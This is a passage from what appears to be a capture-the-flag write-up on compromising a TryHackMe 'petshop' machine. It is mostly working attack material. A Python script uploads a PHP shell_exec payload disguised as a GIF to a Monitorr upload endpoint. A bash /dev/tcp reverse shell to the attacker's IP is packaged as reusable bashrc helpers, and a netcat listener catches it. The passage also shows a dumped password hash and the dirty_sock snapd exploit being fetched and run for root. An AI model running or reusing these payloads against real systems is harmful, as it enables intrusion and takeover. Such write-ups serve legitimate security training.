    &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;isHuman&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain, */*; q=0.01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;X-Requested-With&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XMLHttpRequest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;-----------------------------31046105003900160576454225745&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Type: image/gif&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GIF89a213213123&quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;&amp;lt;?php $output = shell_exec(&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;); echo($output);&quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-----------------------------31046105003900160576454225745--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://monitorr.robyns-petshop.thm/assets/data/usrimg/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure-Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GIF89a213213123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before we try to enumerate, it would probably be best to try get a shell instead of having our script run individual commands.&lt;/p&gt;

&lt;p&gt;I actually ran into some issues doing this, I couldn‚Äôt use just any port. It was only when testing to see if I could make it fetch a file from a http server that I realised only certain ports were allowed.&lt;/p&gt;

&lt;p&gt;This included commonly used low ports such as port 80 and port 443.&lt;/p&gt;

&lt;p&gt;Originally, I tried doing this with ngrok, instead of properly port forwarding.&lt;/p&gt;

&lt;p&gt;The free tier of ngrok doesn‚Äôt allow you to control the port that it opens, so this is why I had to use my friend‚Äôs DO droplet.&lt;/p&gt;

&lt;p&gt;When going back to the machine for the purposes of making this writeup, I thought I‚Äôd make things easier for myself and just port forward via my router instead of creating a new droplet to recreate the original method&lt;/p&gt;

&lt;p&gt;Anyway here is how that went:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  python3 script.py &quot;$(bashrevshell $(myip public) 443)&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above command may look weird. What this is actually running is &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 script.py &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/public_ip/port 0&amp;gt;&amp;amp;1'&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I just have some useful bodge-y things in my &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.bashrc&lt;/code&gt; file that make CTFs a little easier. The ones used here are:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;myip &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;then
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;No arguments supplied, use 'myip tun0' or 'myip public'&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi

  if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wlo1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tun0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;ifconfig &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'input();print(input().split()[1])'&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# would include more interfaces but i only ever need these ones really&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi

  if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;external&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;public&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print(input()[1:-1])&quot;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# cursed&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

bashrevshell &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;then
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/IP/PORT 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0
  &lt;span class=&quot;k&quot;&gt;fi

  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Feel free to append/modify them to your own bashrc file.&lt;/p&gt;

&lt;p&gt;So, if done properly, this should get us a shell:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~]
‚îî‚îÄ‚ïº &amp;gt;  sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 54.154.26.58 48630
bash: cannot set terminal process group (929): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;elevating-privileges&quot;&gt;Elevating privileges&lt;/h1&gt;

&lt;p&gt;So, once I had access as www-data. The first thing I checked out was the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/monitorr/datausers.db&lt;/code&gt; file. This file was mentioned in small text in the monitorr settings page&lt;/p&gt;

&lt;p&gt;the file read:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE TABLE `users` (
                        `user_id` INTEGER PRIMARY KEY,
                        `user_name` varchar(64),
                        `user_password_hash` varchar(255),
admin$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I thought for sure the way to elevate privileges here was to crack this hash and then use that as the password for the robyn user account. I went back to linus in order to steal his GPU power to do this. No dice however. I even considered generating passwords based on a ruleset, using the names of the animals in the pictures on the original websites.&lt;/p&gt;

&lt;p&gt;After some basic testing, I looked at the kernel version in use:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@petshop:/var/www/monitorr/assets/data/usrimg$ uname -a
Linux petshop 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I realised this was an old kernel version, in fact, it even seemed to have privilege escalation exploits on exploitdb. Sadly however, none of them worked&lt;/p&gt;

&lt;p&gt;After trying a few enumeration scripts such as linpeas, I tried out &lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;https://github.com/mzet-/linux-exploit-suggester&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux petshop 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O lol.sh &amp;amp;&amp;amp; chmod +x lol.sh; ./lol.sh

&amp;lt;suggester.sh -O lol.sh &amp;amp;&amp;amp; chmod +x lol.sh; ./lol.sh

--2021-05-10 20:06:19--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87559 (86K) [text/plain]
Saving to: 'lol.sh'

     0K .......... .......... .......... .......... .......... 58% 4.09M 0s
    50K .......... .......... .......... .....                100% 9.62M=0.02s

2021-05-10 20:06:19 (5.37 MB/s) - 'lol.sh' saved [87559/87559]


Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

76 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I went through each one, until I got to dirty sock. This was the one that ended up working. ‚Äúdirty sock‚Äù is an exploit that affects an out of date, vulnerable version of the snapd daemon&lt;/p&gt;

&lt;p&gt;It allowed us to create a ‚Äúdirty sock‚Äù user with root privileges&lt;/p&gt;

&lt;p&gt;Here‚Äôs how that went:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py -O sock.py &amp;amp;&amp;amp; python3 sock.py

&amp;lt;aster/dirty_sockv2.py -O sock.py &amp;amp;&amp;amp; python3 sock.py
--2021-05-10 20:08:15--  https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8696 (8.5K) [text/plain]
Saving to: 'sock.py'

     0K ........                                              100% 57.3M=0s

2021-05-10 20:08:16 (57.3 MB/s) - 'sock.py' saved [8696/8696]


      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&amp;amp;D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/wgpdfjhybs;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now it‚Äôs as simple as switching to the ‚Äúdirty_sock‚Äù user. First to get a proper tty shell so we can switch user, we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
Password: dirty_sock

dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo su
[sudo] password for dirty_sock: dirty_sock

root@petshop:/var/www/monitorr/assets/data/usrimg# cat /root/*
THM{this is a fake flag}
cat: /root/snap: Is a directory
root@petshop:/var/www/monitorr/assets/data/usrimg#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

